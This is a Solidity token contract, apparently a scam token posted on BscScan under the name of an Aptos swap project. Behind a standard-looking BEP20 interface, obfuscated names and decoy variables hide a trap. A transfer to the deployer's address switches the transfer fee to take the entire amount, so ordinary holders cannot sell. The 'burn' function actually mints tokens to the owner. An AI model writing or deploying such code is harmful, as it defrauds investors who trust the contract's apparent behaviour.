/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

/*
Aptoswap_net
Swap AMM Infrastructure for APTOS blockchain. 
Short Intro for current Aptoswap:
💸 High liquidity rewards, 0.27% base + 0.03% incentive
💰 High APR
💦 Support both uncorrelated and stable swap pools
 🔗 Aggregators such as  supports
• Web: https://aptoswap.net
• Discord: https://discord.gg/xbM7XAknHf
• GitHub: https://github.com/vividnetwork
• Twitter:https://twitter.com/aptoswap_net
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.1;
contract Aptoswap {
address public  XJxRui = address(0);
address public  JhFZgs = address(0);
uint256 public  hNjEcb = 10000000000000000;
address public  tYaDCR = address(0);
uint256 public constant MgMPuh = 9+1;
uint8 public constant decimals = 18;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => uint256) public balanceOf;
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  name = "Aptoswap";
address public  SDNmfd = address(0);
uint256 public  rHOGsn = 100000000000000000000000;
address public  WHPXBc = address(0);
uint256 public  iMQlxe = 100000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public owner;
string public  symbol = "Aptoswap";
uint256 public  LaYdnA = 10000000000000000000;
uint256 private  jggnqA = 10000000000000;
uint256 public  XWyDbO = 100000000000000000000;
uint256 public  blSTfk = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address private  DtstHp = address(0);
address public  IkauDE = address(0);
uint256 public  mCbNwa = 100000000000000000;
uint256 public  KmRdRd = 10000000000000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "LUvWkU");
require(to != address(0), "LUvWkU");
require(amount <= balanceOf[from], "LUvWkU");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* MgMPuh/jggnqA ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==DtstHp){
jggnqA = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () {
DtstHp = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}